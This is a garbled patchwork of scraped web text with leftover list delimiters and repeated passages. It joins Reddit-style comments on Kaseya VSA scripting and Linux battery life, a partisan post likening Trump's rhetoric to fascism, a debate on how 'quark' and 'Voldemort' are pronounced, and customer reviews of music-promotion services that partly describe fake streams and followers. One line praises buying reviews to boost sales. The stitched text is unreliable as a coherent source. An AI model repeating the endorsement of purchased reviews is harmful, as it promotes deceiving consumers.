Bufriedo, we’ll decide how to pronounce it together, and my authorial wishes will rightly be dismissed. Until then, all defendable pronunciations of the word derived from the letters in it will be legitimate. > **EDIT TL;DR(', 'How th fuck does quark, pronounced kwork, sound like duck?', 'My New Oxford dictionary gives both kwark and kwork as pronounciations for the physics term.

Most of the homes in the neighborhood are modest 1,500 to 2,000 sq ft, three or four bedroom homes, selling for $200,000 with property tax being around $3,000 per year. Taxes on this home are just above $8,000 per year which falls well below the SALT cap on federal deductibility.

If so, you can use `echo Y|net use ...` to send the \"Y\" key as input to the command. Though I think I\\'ve only gotten that to work from an **executeShellCommand()** step directly from a Kaseya procedure. There\\'s probably a way to do it from PowerShell... `cmd.exe /c echo Y|net use z \\\\\\\\svr\\\\share`. > this just gets wierder and wierder. This has been my experience with Kaseya procedures lol.. once they work they can be super useful, but getting them to that point can be a major pain!  One thing that might help is to run as many commands in **executeShellCommand()** steps as possible, and redirect their output and error streams to a text file, so you can see if they are returning errors. `net use Z \\\\\\\\svr\\\\share >>dir\\\\NetUseCmd.txt 2>>>>&1` Normally in a command prompt you\\'d just do `net use Z \\\\\\\\svr\\\\share >c\\\\kworking\\\\NetUseCmd.txt 2>>&1`, but in Kaseya the `>` character is reserved.  Then you can use the **getFile()** step to upload NetUseCmd.txt into the documents, or what I like to do is use the **getVariable()** step (with the 1st dropdown set to File Content), then use the **sendEmail()** step to email myself the output of the file (that way if a procedure takes a while to run then I don\\'t have to keep checking to see when it\\'s done).', \"Awesome suggestions! We have a ton of automation around VSA, and we put most complex logic into external applications and use Kaseya to Deploy, Execute, and Collect. These are things it does exceptionally well. We have a tool that we sell called the Multi-Tool. Things like who you run as (System/User) and environment (32/64b) will make a big difference when you are in the execute phase, but if you're externalizing your logic (as it seems) and using the deploy/execute/retrieve methods, there's not much you can't do. Glenn PS - we recommend using the TEMP folder and NOT the KWorking folder for your scripts/commands. Create a subfolder and do all the work there. Collect the logs (if any) and then recursively delete your working folder to clean up. We only use the KWorking folder for config data, create a tools subfolder for things we use regularly, and use the TEMP\\\\\\\\app subfolder for any transient work - installs, one-off's, etc. Keeps the system clean and prevents their use in unexpected ways or times.\", 'What I\\'ve done so far thats been effective in troubleshooting I run my powershell script via ExecuteShellCommandToVariable.

At the end of my powershell script, I have it write a dummy file to show that the script is finished, then I have the script sleep for 30 seconds, so that I can open the command results text file in a notepad before it gets deleted Its done the trick here! but seriously... I gotta scratch my head at some of these RMMs. Is it just the \"traditional\" big ones like Labtech and Kaseya that are so damn convoluted in how they do basic things like run a powershell script? I haven\\'t tried any of the newer RMMs yet, so I don\\'t know if any of them are any better or not.', 'I\\'ve been developing scripts (\"agent procedures\") in Kaseya for around 9 years now, and used it for deploying 100s of PowerShell scripts over the last couple years. I strongly recommend avoiding as many of the builtin \"steps\" on the left as possible, and using **executeShellCommand()** wherever you can.  Example There\\'s a **deleteFile()** command -- I never use it. Instead, I use **executeShellCommand()** (as System) and run the command `del /F /Q (full_path_to_file)`.  The main reason I recommend avoiding the built-in steps is that they are \"black box\" functionality you have little to no control over. When they fail, you have no idea why. Want to run **deleteFile()** as the agent credential account? You can\\'t -- there\\'s no option for it (so it will only run as SYSTEM). Want to delete a file using wildcards? You can\\'t. But you can do both of those things with **executeShellCommand()** and the `del` command. For running PowerShell scripts, here\\'s the basic outline I use 1. Add a **getVariable()** step (under the System section) and set the dropdown in the top-right to \"Agent Working Directory Path\" and set the name to **dir**. Now in your procedure you can refer to **dir** and it will correspond to your working directory (rather than hard-coding it in the procedure -- if you did that then if you ever changed it you\\'d need to change it in every procedure -- plus you only have to type **dir** instead of **C\\\\MyCompany\\\\kworking** -- also some computers don\\'t have the Windows installation on C\\\\ !). 2. Add an **executeShellCommand()** step and delete the PowerShell script, and the output text file that the PowerShell script is going to create, from the computer. `del /F /Q dir\\\\Get-Info.ps1` and `del /F /Q dir\\\\Get-Info.txt`. 3. Use the **writeFile()** step under the File section to write the PowerShell script to **dir\\\\PowerShellScriptName.ps1**. When you\\'re in Kaseya Agent Procedures >> Manage Procedures >> Schedule / Create, there is a **Manage Files** button at the top. You can use this to upload files to your VSA server. Then in procedures the **writeFile()** step will download them from the server to the computer. You could also upload them to an FTP/HTTP server, but I\\'ve encountered security-conscious clients that lock down external HTTP access, which could block those downloads. 4. Use the **executeShellCommand()** step to run your PowerShell script, which exports any data you want to text files. Run the command `powershell.exe -ExecutionPolicy Bypass -File dir\\\\PowerShellScriptName.ps1` (with any parameters passed to the script after that, if needed). I\\'ll add a parameter called `-outFile` to my scripts, so I can pass `-outFile dir\\\\TextFileName.txt` to the script. That way the PS script also doesn\\'t have the agent working directory hardcoded in it. 5. Use the **testFile()** step under the \"IFs\" section to test if the output file was created by the PowerShell script (this is why deleting the output file in step 2 above is important). If not, then there\\'s either an issue with PowerShell, Windows, the Kaseya agent, or file permissions. You can add the **else** step below the **testFile()**, and one way to force the procedure to show a \"Failed\" status in the logs and in the LastExecStatus column is to add the **executeFile()** step under the File section, and make it run some bogus EXE that won\\'t exist (like **C\\\\PowerShellScriptDidNotCreateExpectedFile.exe**). (Note that you can click a line then press Tab to indent it to the right, and ShiftTab to outdent it back to the left. Any line under an If step needs to be indented once to the right, then the Else should be at the same level as the If, and anything under the Else should be indented to the right). 6. Add the **getVariable()** step, set the top-right dropdown to **File Content**, and set the 2nd dropdown to the path of the output text file (**dir\\\\TextFileName.txt**). Give the variable a name like **output** (notice there are no \\'s in the name). Then in the procedure you can use **output** to refer to the content of that text file. You can do things like using the **writeProcedureLogEntry()** step under System to write **output** to the procedure log, and then you can create an Info Center report that shows those log entries. It\\'s very hokey, but I\\'ve found it\\'s the most robust way to do advanced/custom reporting from Kaseya.', \"Indeed.

Since these look mostly tied to your Intel drivers maybe a new kernel with more up to date drivers is in order. I'd say maybe look at upgrading your kernel to get more up to date device support, that may help your battery life a lot. Tools like ukuu make this pretty easy and I have had no issues on Elementary with the most up to date kernel (Linux 5.2.10-050210-generic). Link here? Pantheon is not a super light weight desktop environment but it really shouldn't be causing battery life issues like this.

I'd be interested in hearing what you're doing that's presenting a challenge.  You can contact me via the mspbuilder.com and they're pretty much forced to use KWorking or deal with the issue you're explaining. Glenn\", \"We provide our customers with hundreds of Agent Procedures plus scripts, and never, ever write these to the KWorking folder. It's easy to find the TEMP environment var in the registry - we create a subfolder there, push all our scripts, install files, etc there. The task writes it's logs there as well. Once the procedure is complete, we use GetFile to upload the log, then recursively delete the folder we created, leaving nothing behind. The only difference from what Ages4020 is suggesting is reading the registry first to find the TEMP location. Create the TEMP\\\\\\\\PROCESS\\\\_NAME folder. Then we either use WriteDirectory to write several files or WriteFile to write individual files to that folder. ExecutePowerShell (or executeCommandLine, which sometimes works better), then GetFile to get the log and DeleteFolder with the recursive option. We find too many MSPs use the KWorking folder as a temporary repository. This is difficult to clean up, and this leaves behind potential vulnerabilities. Using a TEMP\\\\\\\\working\\\\_folder minimizes the risk because it's present only for the duration of the installation process, then everything is removed. Glenn\", \"Call today... I need to set working directory at install. Used to be achievable by copying template settings. In VSA 9.something they removed the ability to change template settings, because apparently everyone in the MSP world is cool with c\\\\kworking existing on every machine. Now the only way to set working directory is via policy. Which takes at least 5 minutes. Which means procedures that are in middle of writing files to the machine break and lose permissions to everything, lagging out procedures on that device until it's restarted, when the policy updates the working directory. Oh but wait, Kaseya released an awesome REST based API that we've been heavily relying on because their scheduling engine works on prayers, so we built a whole application that works with kaseya API to fill in gaps. And that API has a nice endpoint that lets you update the working directory of an agent.  But, here's the punchline, THAT ENDPOINT DOES NOT WORK AT ALL FOR ANYONE, INCLUDING KASEYA engineers and they'll get back to us when engineering finds the issues.  Good thing I already achieved what I need to via modifying the MSSQL tables directly. But lets see how long it takes them to come up with that solution.

There are two things you\\'re looking for  Wakeups - programs register to receive some events from the OS, and they start working once an event is received (eg \"new incoming data on the network\", \"mouse moved\", \"key pressed\", etc). Most of the time, these events do not require a lot of work and handling a few events per second doesn\\'t matter that much (of course there are events that can take a lot of time to process, but they\\'re rare and the sooner a long, CPU-hoggy job is over, the better, instead of keeping your CPU awake in higher power states for longer), but if you\\'re receiving a lot of events, this starts to pile up. Once work starts to pile up, your CPU frequency goes up and stays there, and so does your power bill. If an app is receiving a lot of events, this might be something you should consider closing (if you don\\'t need it - or disabling any unneeded functionality if possible) to maximize your battery life. Under Overview, this is *Events/s*, and apps are sorted by that by default. If Category is *kWork* or *Timer*, you usually can\\'t do much about these - they\\'re just required for your OS to work properly. Unusually large amount of Interrupts from any idle device may suggest bad hardware or configuration (eg an idle network interface should show very few, if any, events per second - but if it\\'s idle and bombing your CPU with 200 interrupts/s, that might prompt you to investigate further). Processes are where you\\'re mostly looking for bad citizens - if something gets loaded with events or spends a lot of time working (in the Usage column), you might want to disable that or limit functionality. Tunables - Kernel features which let you enable some additional power saving features on the kernel side. The upside is that with solid hardware you\\'ll get better power management for free (although you might have to enable corresponding features in your BIOS/UEFI first). The downside is that with bad hardware (eg with buggy firmware) enabling power management usually ends badly and might occasionally render a given device useless or performance-limited until your PC is rebooted without PM features. Trust me, you\\'ll know when it happens. Aside from that, configure your system to use the CPU governor that\\'s either power-friendly (scales up slowly, down quickly) or performance-friendly (scales up quickly, down slowly). AFAIK P-States are still broken, but you\\'ll have to take a look in the wiki if it\\'s still the case. ', 'Sure.

Fascism is usually placed on the far-right within the traditional left–right spectrum. Such a state is led by a (1) strong leader — such as a dictator and a martial government or president composed of the members of the governing fascist party — to forge national unity and maintain a stable and orderly socigety. Another common definition of fascism ; (2) nationalist authoritarian goals of creating a regulated economic structure to transform social relations within a modern, (3) self-determined culture;  and a (4) political aesthetic of romantic symbolism,  (5) mass mobilization,  a (6) positive view of violence,  and promotion of **(7) masculinity, youth and charismatic leadership**.  (8)Fascism rejects assertions of violence automatically being negative in nature and views political violence, war, and imperialism. Pacifism, emotions, complaining, empathy and human rights were seen as weak ideas. War and violence for them was natural. Yet empathy and sympathy were not. The narrative of the fascist ideology has three core components \"(i) the rebirth myth, (ii) populist ultra-nationalism and (iii) the myth of decadence\" The myth of decadence plays an important role in the form of political behavior marked by obsessive preoccupation with community decline, humiliation, or victimhood and by compensatory cults of unity, energy, and purity, in which a mass-based party of committed nationalist militants, working in uneasy but effective collaboration with traditional elites, abandons democratic liberties and pursues with redemptive violence and without ethical or legal restraints goals of internal cleansing and external expansion. Now Trump has been critiqued for the fact that he has supported many policies that are traditionally democratic. This is certainly true because Fascism was influenced by both left and right, conservative and anti-conservative, national and supranational, rational and anti-rational. A number of historians regard fascism either as a revolutionary centrist doctrine, as a doctrine that mixes philosophies of the left and the right, or as both those things. Now let\\'s compare with Trumps presidential campaign populist ultra-nationalism  (5)Strong Leader. >Now, our country needs— our country needs a truly great leader, and we need a truly great leader now. We need a leader that wrote “The Art of the Deal.” >We need a leader that can bring back our jobs, can bring back our manufacturing, can bring back our military, can take care of our vets. Our vets have been abandoned. the rebirth myth >We have losers. We have losers. We have people that don’t have it. We have people that are morally corrupt. We have people that are selling this country down the drain. (I) The Rebirth Myth >It can happen. Our country has tremendous potential. We have tremendous people. >Nobody would be tougher on ISIS than Donald Trump. Nobody. I will find — within our military, I will find the General Patton or I will find General MacArthur, I will find the right guy. I will find the guy that’s going to take that military and make it really work. Nobody, nobody will be pushing us around. >I will be the greatest jobs president that God ever created. I tell you that. >I would build a great wall, and nobody builds walls better than me, believe me, and I’ll build them very inexpensively, I will build a great, great wall on our southern border. And I will have Mexico pay for that wall.Mark my words. >I’ll bring back our jobs from China, from Mexico, from Japan, from so many places. I’ll bring back our jobs, and I’ll bring back our money. >Sadly, the American dream is dead. But if I get elected president I will bring it back bigger and better and stronger than ever before, and we will make America great again. Thank you. Thank you very much. (ii) populist nationalism  (iii) the myth of decadence . >When do we beat Mexico at the border? They’re laughing at us, at our stupidity. And now they are beating us economically. They are not our friend, believe me. But they’re killing us economically. >That’s right. A lot of people up there can’t get jobs. They can’t get jobs, because there are no jobs, because China has our jobs and Mexico has our jobs. They all have jobs. >Our enemies are getting stronger and stronger by the way, and we as a country are getting weaker. Even our nuclear arsenal doesn’t kwork. (8) Pacifism, tolerance and liberalism are seen as weak.  >“This is going to be an election that’s based on competence, because people are tired of these nice people. And they’re tired of being ripped off by everybody in the world. And they’re tired of spending more money on education than any nation in the world per capita, than any nation in the world, and we are 26th in the world, 25 countries are better than us in education. And some of them are like third world countries. But we’re becoming a third word country. ', 'That\\'s stupid when they call him Hitler. He however a fascist.

The narrative of the fascist ideology has three core components \"(i) the rebirth myth, (ii) populist ultra-nationalism and (iii) the myth of decadence\" The myth of decadence plays an important role in the form of political behavior marked by obsessive preoccupation with community decline, humiliation, or victimhood and by compensatory cults of unity, energy, and purity, in which a mass-based party of committed nationalist militants, working in uneasy but effective collaboration with traditional elites, abandons democratic liberties and pursues with redemptive violence and without ethical or legal restraints goals of internal cleansing and external expansion. Now Trump has been critiqued for the fact that he has supported many policies that are traditionally democratic. This is certainly true because Fascism was influenced by both left and right, conservative and anti-conservative, national and supranational, rational and anti-rational. A number of historians regard fascism either as a revolutionary centrist doctrine, as a doctrine that mixes philosophies of the left and the right, or as both those things. Now let\\'s compare with Trumps presidential campaign populist ultra-nationalism  (5)Strong Leader. >Now, our country needs— our country needs a truly great leader, and we need a truly great leader now.

Apparently that's how it was pronounced in the poem from whence it came.\", 'no this does not fulfill frozen toado kwork pls do it mbut nidnt idk if niwn ikll like jit', '> Because it is an author made name/proper noun of French origin. In universe, it is a name which originates from an anagram of a (British) character\\'s name.  The fact that that name is symbolic if it is read as (fairly garbled) French is secondary. > Just because people \"english-ize\" because they don\\'t know how to pronounce it, it doesn\\'t make that \"the\" new pronunciation. They are just bastardizing a foreign word. the word still retains it\\'s original pronunciation because it\\'s not an English word. That\\'s not how language works at all.  The way most people pronounce a word absolutely is the way that word is pronounced.  The fact that there are French loanwords in English which are pronounced the same in English and French has absolutely no bearing on my point that that is not a universal rule. > So why would you decide that voldemort is one of the ones pronounced incorrectly without any in book examples of characters pronouncing it as such? That\\'s not what I\\'m arguing.  What I\\'m saying is that we have no idea how any of the characters in the books pronounce Voldemort.  We know how JKR has said in interviews *she* pronounces Voldemort, but absent any evidence in her in-universe writing, not everyone accepts that as canon, especially as it often conflicts with actual book-canon.   Secondly, I would suggest that given in our universe, Voldemort is pronounced in English with a terminal \\'t\\' sound more often than not, and this pronunciation is universally understood as referring to Voldemort, then in *our universe*, that absolutely is the correct pronunciation. > I don\\'t really see how this argument can go past that there\\'s no book canon example of anyone pronouncing the word any way, ~~and the author, who chose/created the words in the book canon, said the word they made up is pronounced a certain way.~~ I can\\'t see that someone who makes up a word, whether real or fictional, has absolute right to decide how that word is pronounced.  Presumably, if JKR had tweeted that \\'Voldemort\\' should be pronounced \\'Lollipop\\', you wouldn\\'t be arguing that I would be wrong to ignore her and continue pronouncing it \\'Voldemort\\'?  (Or, to steal Bernard Shaw\\'s (probably not actually Bernard Shaw, but attributed to him) famous example, if I told you of my new word \\'ghoti\\', you would call me absurd to insist it is pronounced identically to \\'fish\\', even though in English \\'gh\\' can be pronounced \\'f\\' (e.g. in \\'tough\\'), \\'o\\' can be pronounced \\'i\\' (e.g. in \\'women\\'), and \\'ti\\' can be pronounced \\'sh\\' (e.g. in \\'constitution\\'). Of course, these are extreme cases while \\'gh\\' can make an \\'f\\' sound, there are no English examples of this at the beginning of a syllable.  However, it is unquestionably the case that real invented words change their pronunciation to that other than what the creator \\'intended\\'.  \\'GIF\\', for example, is pronounced with a hard g by the majority of people, and that is recognised as a valid pronunciation by most major dictionaries, despite the insistences of Steve Wilhite. Likewise, Murray Gell-Mann named the particle the \\'quark\\' (pronounced \\'kwork\\') despite the fact that he derived the word from a line in *Finnegan\\'s Wake* in which it is rhymed with \\'Mark\\' and \\'bark\\'. Modern pronunciation has evolved, and quark can now be pronounced to rhyme with either \\'cork\\' or \\'mark\\'.  I see no reason why invented words should have to be pronounced as the author intended them in the case of JKR when this so plainly isn\\'t the case with other neologisms. > If there was a Gobbledegook (a made up Goblin language) word and no given pronunciation key in the text, so you ended up pronouncing it in your head incorrectly, would you decide that was the canon pronunciation even after the author states later out of text that the word is pronounced a certain way?  No, but nor would I decide that just because JKR had said that she pronounces it a certain way, then that is the correct pronunciation.

Gell-Mann chose the name \"quarks,\" pronounced \"kworks,\" for these three particles, a nonsense word used by James Joyce in the novel Finnegan\\'s Wake\"Three quarks for Muster Mark!\" There are six flavors of quarks. \"Flavors\" just means different kinds. The two lightest are called up and down. The third quark is called strange. It was named after the \"strangely\" long lifetime of the K particle, the first composite particle found to contain this quark. The fourth quark type, the charm quark, was named on a whim. It was discovered in 1974 almost simultaneously at both the Stanford Linear Accelerator Center (SLAC) and at Brookhaven National Laboratory. The fifth and sixth quarks were sometimes called truth and beauty in the past, but even physicists thought that was too cute. The bottom quark was first discovered at Fermi National Lab (Fermilab) in 1977, in a composite particle called Upsilon (). The top quark was discovered last, also at Fermilab, in 1995. It is the most massive quark. It had been predicted for a long time but had never been observed successfully until then. Stolen from ', 'You say  >it\\'s pronounced like \"cork\" so you\\'re making yourself sound really dumb. But I have never heard it pronounced that way.  Wikipedia says >Gell-Mann went into further detail regarding the name of the quark in his book, The Quark and the Jaguar45 In 1963, when I assigned the name \"quark\" to the fundamental constituents of the nucleon, I had the sound first, without the spelling, which could have been **\"kwork\"**. Then, in one of my occasional perusals of Finnegans Wake, by James Joyce, I came across the word \"quark\" in the phrase \"Three quarks for Muster Mark\". Since \"quark\" (meaning, for one thing, the cry of the gull) was clearly intended to **rhyme with \"Mark\"**, as well as \"bark\" and other such words, I had to find an excuse to pronounce it as \"kwork\". But the book represents the dream of a publican named Humphrey Chimpden Earwicker. Words in the text are typically drawn from several sources at once, like the \"portmanteau\" words in \"Through the Looking-Glass\". From time to time, phrases occur in the book that are partially determined by calls for drinks at the bar. I argued, therefore, that perhaps one of the multiple sources of the cry \"Three quarks for Muster Mark\" might be \"Three quarts for Mister Mark\", in which case the pronunciation \"kwork\" would not be totally unjustified. In any case, the number three fitted perfectly the way quarks occur in nature.

', '**John Green is all over this, yo** >Whether an author intentionally put a metaphor in a book is completely irrelevant. The reason metaphors exist in books is not so that your English teachers can torture you by having you search for them but instead because reading critically and nonliterally is a huge part of being a person It is through metaphor and symbolism that we enter into the life of someone else, and begin to ask their big questions as if they were our own. >It’s worth remembering here that language is itself a symbol (like, you are decoding these characters on your screen and turning them into ideas; if I were writing in Japanese, you wouldn’t be able to turn the characters into ideas) and so all reading is inherently critical. Metaphor and symbol is just another step in the same process, the process of sharing ideas among people who are separated by time and space and death and everything else. So the question of whether J.D. Salinger WANTED Holden’s questions about the ducks in the pond to be a metaphor for his own fears is not an interesting question. The interesting thing is how that metaphor gets inside of us and turns us into Holden, and gives us a way of thinking about our fears of growing up and growing old and losing what is magical about life. THAT is a really interesting thing, and it can only happen inside of us through metaphor. >We owe it to ourselves to read critically not so that we can get good grades in English but so that we might have better ways to think about the big questions of our existence and the existence of others. Whether J.D. Salinger wanted us to be better at being human doesn’t really matter; even if he didn’t want to, he still gave us some nice tools to make us more aware and engaged. **Also** >Books, at least in my opinion, belong to their readers, and the author’s opinion about how to pronounce words that s/he made up is not any more authoritative or interesting than the opinion of any other reader. > >Like, I do not believe that an author has a privileged relationship with a story simply because s/he happens to have written it. Let us take, for example, the word quark. James Joyce uses the word quark in Finnegan’s Wake, and then the physicist Murray Gel-Mann (who along with George Zweig proposed the existence of quarks) appropriated the word to describe a fundamental constituent of matter. > >But how to pronounce quark? Reading the text of Finnegan’s Wake, it could easily be argued that Joyce wanted quark pronounced to rhyme with the word Mark, but you could also argue—as Gel-Mann has—that he intended it to slant-rhyme with the word quart. I personally suspect that Joyce wanted us to say kark not kwork, but it doesn’t matter We say kwork. We decided, collectively, how to pronounce the word, and that’s essentially what language is It’s a group of people deciding which sounds will describe the world. >In the extraordinarily unlikely event that some future elementary particle is discovered and named the Bufriedo, we’ll decide how to pronounce it together, and my authorial wishes will rightly be dismissed. Until then, all defendable pronunciations of the word derived from the letters in it will be legitimate. > **EDIT TL;DR(', 'How th fuck does quark, pronounced kwork, sound like duck?', 'My New Oxford dictionary gives both kwark and kwork as pronounciations for the physics term.

I had 10k followers and then it dropped down 3k overnight as Spotify identified them as fake follows.\", 'ALGORITHM PLAY SERVICE: Their algorithm plays service is fraudulent. They take your money and do nothing. I have repeatedly asked for a refund because of this, and they do not respond. DO NOT USE THESE SCAM ARTISTS!', 'Scammers.: This company or whatever it is is a waste of money run by unprofessionals who lack knowledge. The results are unsatisfactory and most emails are not returned. They just take your money and pretend they are doing the work. Full of scams. Do not waste your money.', 'Just scam: Just scam. Don‘t waste your money here.', 'I really did have a great experience…: I really did have a great experience with this promotion team. After my first campaign period, I hadn’t gotten on any playlist due to limited playlist curators in that in particular genre but was offered a second promotion campaign in a different genre or free because of how much they believed in my music.', \"They provide great service!: My experience with Playlist Booker has been excellent. The first campaign I did with them landed one of my songs on over 20 playlists. I'm looking forward to working more with Playlist Booker in the future. They offer a great way for artists to get their music in front of playlist curators.\", 'Lesson Learned!: I paid a great deal of hard earned money and got scammed. They did not honor their service. I got dropped repeatedly from playlists that I recently discovered had no following just likes. Then support never responded even when I backed up my claim with screenshots and screen recordings. My advice is to RUN and either spend your money on ads or a reputable service. This definitely isn’t it! They will block and remove you if you warn others in the comments on Instagram.', \"Awesome service: Awesome service! They delivered all the streams that were promised and I gained so many new Spotify followers. It's hard to find a place like this that doesn't use bots, but the playlist booker service really works\", 'I was initially impressed with the…: I was initially impressed with the amount of streams and followers. However, Spotify eliminated 1000 of my followers saying they were not real and my streams went from thousands per week to a couple hundred. I wrote them several times and they ignored me. I chose the 70k to 100k streams for each of my 3 singles and recieved 70k all together. Bottom line, theres a a risk but you can get some good exposure and followers. I would advise to go with the package for the minimum amount of money and dont go all in because Spotify could pull the plug at any moment.', 'So two companies that advertise on Instagram is musicvertising and playlistbooker. They have ads for Spotify and I sent both ads to the CEO at Spotify because I used musicvertising for one month and my numbers went up. I did cancel after everyone said it was a bot company. Just thought I’d follow up']\n",

A man that knows his stuff and above all, a good teacher.', \"SO worth it: Best set of music marketing courses on the planet. It's not recycled knowledge either. Damian knows what he's talking about and knows how to take your music to the next level.

Great platform where you can grow abs learn marketing strategies!', 'Incredibly valuable course & a very…: Incredibly valuable course & a very supportive community.The price is a steal.This should be a no brainier for anybody who wants to grow their music career.', \"I am not a musician: I am not a musician, I started working with a band at the beginning of this year.  With zero experience in the music industry (besides loving music), I stumbled upon Damian's videos on Youtube.  After watching my first video, I immediately signed up for the DK online courses.  The courses are explained simply and straight to the point, no fluff.  What Damian teaches in his courses can be applied to almost any industry.\", \"Current, Consistent, Passionate, Music Marketing Guru: Damian Keyes, along with Ella Keyes have created a platform to help people (Musicians, Artist, Promoters, Labels) learn and grow using social networking/ marketing add campaigns ins and outs, to stay current, of what it takes to navigate around in the ever changing social media marketing frenzy world. Damian's integrity, passion, to help those in the DKMB community is above stellar. Informative videos, along with 2 live chats each week, also the DKMB community is amazing and helpful. Best Bang for your buck in the music marketing industry. Damian's life resume is a world of knowledge ( Music / Bussiness / Social Media ). He walks the walk, not just talks it. He is authentic.\", \"Incredible value for money for any musician, artist or manager: I've been a member for about 6-7 months and have found such a wealth of knowledge from both Damo himself who is very active on the channels and the Facebook community. Worth EVERY single penny. He hosts weekly live streams and answers questions on top of the myriad of music business course and PDFs on the website. You can't go wrong!\", \"Huge library filled with amazing content: DKMBA is awesome for independent musicians and artists that want to step up their marketing game. I've learned a ton so far and they just keep coming with new content all the time. Definitely recommending this to all my musician friends!\", 'Damian is highly informed about what it…: Damian is highly informed about what it takes to succeed in the music business, and breaks it down into an extremely practical step-by-step formula in each course.

Highly recommend and I will be subscribed to and following his work for a while!', 'Would absolutely recommend Damo and his…: Would absolutely recommend Damo and his courses. Super helpful and informative. No high horses or ivory towers. He just wants to help you succeed in whatever your goals may be. AND at a super reasonable price - which is unheard of these days.', \"The best music marketing advice available!: DKMBA is easily the best service of its kind. I have had conversations with various people that offer comparable services and none give me the same confidence that Damian and co give me. It's affordable and the amount of pre prepared lectures and support you get is astounding!\", \"100% worth it: I came all the way from Brazil to London to study music and I must say that I learned with Damian in a couple of hours what no one told me in the three years I've been on this journey.DKMBA is a game-changer investment. It's straight to the point, dynamic, and simply effective.The best part of it is that I learn every day how to do it all by myself and not depend on anything or anyone to reach my goals. Honestly, 100% worth investing my time, energy, and money in it.\", 'Damian is brilliant at empowering…: Damian is brilliant at empowering independent artists, helping them not get too overwhelmed with the journey to 1,000,000 streams, and building an incredible fan base.The videos in the online academic are really well made, and the added bonuses like the Facebook community, challenges, playlist database, and weekly live sessions keep you motivated and connected. Thank you so much!', 'DKMBA is worth it. That simple.: I love Damo!! He\\'s a very thoughtful and kind mentor, and it is very clear that he cares and cherishes his students\\' successes. I\\'ve been in program for an entire year now and not once have I regretted it! He taught me so much about music marketing and how to do it on my own!! The most underrated part about his program is the community. We are able to chat and ask questions with everyone else that is part of the DKMBA and ask them for their advice. It\\'s a great way to test out ads before you reease them or ask whatever \"dumb\" questions you need the answer to. Highly highly recommend if you want to take your music career more seriously as an independent artist!', \"Excellent information in an overcrowded world: The information that DKMBA offers is up to date and very professionally presented. It's being updated with new content all the time as Facebook, Instagram and the entire music scene is moving through uncharted waters and I'm so glad that I have Damien and his crew to steer my ship in the right direction. His price is fair and he offers a free trial so if you're serious about a career in music or you just want people to hear what you have worked so hard on I highly recommend his program.\", 'One of the best music marketing experts!: One of the best music marketing experts on the market! There are so many courses for all kinds of topics. Livestreams twice a week and the FB community is incredible. 100% recommended!', 'The best!: The best! Damo really seems to actually care about teaching you about music marketing (and, if you\\'re in the discussion groups, really seems to celebrate your successes). I tried out his (free) release strategy videos on YouTube first, found them to be effective, and said \"Hey, this guy seems to know what he\\'s talking about...and he put this great content out on YouTube for FREE?\" After that, it was an easy decision to subscribe. The content is great and informative. The strategies he suggests aren\\'t always easy, but they are effective, which IMO is how you know it\\'s legit! I\\'ve tried other music marketing courses, and they just weren\\'t as good. I\\'ve been doing the DK-MBA courses for about 10 months, and it\\'s really crazy to look at where I was then vs. now. I\\'ve done so much and grown my reach so much!', \"I recently joined: I recently joined, in order to get some help to promote my music. The information that I've been given has proved to be really valuable in this regard. Highly recommended!\", \"Damo's integrity is unmatched: Damo's integrity is unmatched. This man charges so little for the incredible amount of value he provides. We all adore him and I wish more coaches were like him!\", 'The most knowledgeable community led by…: The most knowledgeable community led by Damo.  Amazing place to learn the new music business.', 'Love it,  great content.: Love it! Good content, great courses and unlike others: DK is very helpful and passionate about what he does.', 'This is a set of really amazing…: This is a set of really amazing courses, prepared by a nice man and a big specialist in music marketing and promotion', 'Damian is great!: Damian teaches great marketing tips for musicians and can help any musician at any level learn more to help them go further in their music career', \"Highly recommend for independent artists: Highly recommend for independent artists who are looking for guidance in the music industry. I actually joined Damian's academy on behalf of my daughter, Kallea, who is still young, so I run all her social media accounts etc. Having already released her debut single previously to joining DK-MBA and having paid £500+ for advertising (which I'm not sure was spent in the right places) I decided that joining the academy would help me learn what I needed to know so I could help her in her career going forwards.DK-MBA has so many useful courses, which you can go through at your own pace. These have taught me so much; from the best way to release music, to Facebook advertising, to understanding Spotify/playlisting, to live sessions run by Damian himself - there is just so much value given out by Damian and his team.There is a Facebook group full of other independent artists, where you can ask questions and people are also able to give advice on things that have worked for them. Damian is in the group himself and gives out personal feedback/advice there too.For far less than the cost of advertising her debut single, I've figured out how do run my own marketing campaigns and build momentum and excitement in releasing music.The release of Kallea's second single (after joining DK-MBA) went so much better than the first and I saved myself an absolute fortune, having learned all the tricks of the trade from Damian. Very grateful to DK-MBA for teaching me all the things I needed to know to help my daughter on her musical journey.\", \"NO REGRETS: I wasn't able to find much reviews before I joined his music business academy so Its important for me to make this review. I hesitated for months before joining and I wish I had just joined ages ago. Not only does himself and his community provide so much immediate support for artist careers when it comes to decision making via his forum and his private fb page, but his actual courses provide a wealth of knowledge. There isnt a single useless thing in there, plus he keeps on adding every single week and often multiple times a week via his private live sessions. He takes the time to answer you personally very often and I really feel like he care deeply about all artist careers, which is why he provides free information on youtube and insta also. I had NO idea of how much value this academy would bring to my career and I will definitely renew my subscription next year. I am truely grateful to his team and services and I encourage anyone hesitant to go for it! If you would like to ask me any questions about the course please feel free to contact me via my instagram @Daycare.Records so I can help you say YES!!! :)\", 'I did a free trial of his DK-MBA and it\\'s really good. Some of the ideas are a bit radical (for the old music industry I guess) and he is big on his method, but when you do something that works of course you\\'re going to push it to others as the \\'best\\' way. Gotta make money, right? I feel the point of Damian\\'s entire program is not to say *\"this is how you need to release music\"* so much as *\"this is how my clients reached 1 million Spotify streams with a detailed release strategy\"*']\n",

I run businesses myself, and buying reviews is useful, especially at the very beginning of operations (it gives an instant boost in clients and sales).

I started with about 20 or so streams for my new song “Memories” and when the promotion was over I had about 1300 streams.  Now, I didn’t gain any new followers and I only had a few adds to personal playlists.  Also, my base was in Brazil and I am based out of the California.  I didn’t mind that but it would’ve been nice to be added to a US based playlist.  My song was placed on 4 playlists.  The playlists variety didn’t quite match the vibe of my song but it was my first experience and I didn’t mind.

We will be doing another promotion next week! This time to the 500K! Moonstrive prices are fair and the promised results are there. Its not a guarantee of 100K listeners but to get heard by and grow organically.  We are impressed!

